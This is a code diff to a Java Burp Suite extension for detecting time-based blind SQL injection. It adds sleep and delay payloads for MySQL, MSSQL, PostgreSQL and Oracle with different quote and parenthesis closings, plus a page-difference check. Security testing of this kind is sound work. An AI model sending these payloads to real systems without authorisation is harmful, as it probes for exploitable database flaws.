@@ -12,10 +12,26 @@ import burp.api.montoya.http.message.params.HttpParameter;
 public class TimeBasedInjection extends AbstractInjectionStrategy {
 
     private static final String[][] PROBES = {
+        // 单引号
         {"' AND SLEEP(5)-- -", "MySQL"},
         {"'; WAITFOR DELAY '0:0:5'-- -", "MSSQL"},
         {"' AND 1=(SELECT 1 FROM pg_sleep(5))-- -", "PostgreSQL"},
         {"' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -", "Oracle"},
+        // 双引号
+        {"\" AND SLEEP(5)-- -", "MySQL"},
+        {"\"; WAITFOR DELAY '0:0:5'-- -", "MSSQL"},
+        {"\" AND 1=(SELECT 1 FROM pg_sleep(5))-- -", "PostgreSQL"},
+        {"\" AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -", "Oracle"},
+        // 单引号+括号闭合
+        {"') AND SLEEP(5)-- -", "MySQL"},
+        {"'); WAITFOR DELAY '0:0:5'-- -", "MSSQL"},
+        {"') AND 1=(SELECT 1 FROM pg_sleep(5))-- -", "PostgreSQL"},
+        {"') AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -", "Oracle"},
+        // 双引号+括号闭合
+        {"\") AND SLEEP(5)-- -", "MySQL"},
+        {"\"); WAITFOR DELAY '0:0:5'-- -", "MSSQL"},
+        {"\") AND 1=(SELECT 1 FROM pg_sleep(5))-- -", "PostgreSQL"},
+        {"\") AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -", "Oracle"},
     };
     private final ThreadLocal<String> lastPayload = ThreadLocal.withInitial(() -> "");
     private volatile long timeThreshold = 4000;
@@ -43,6 +59,7 @@ public class TimeBasedInjection extends AbstractInjectionStrategy {
             long t1 = System.currentTimeMillis();
             HttpRequestResponse rr = send(append(origReq, param, lastPayload.get()));
             if (rr == null) continue;
+            if (isDifferentPage(baseBody, body(rr))) continue;
             long elapsed = System.currentTimeMillis() - t1;
 
             if (elapsed >= timeThreshold && elapsed > Math.max(baseTime * 5, 1000)) {
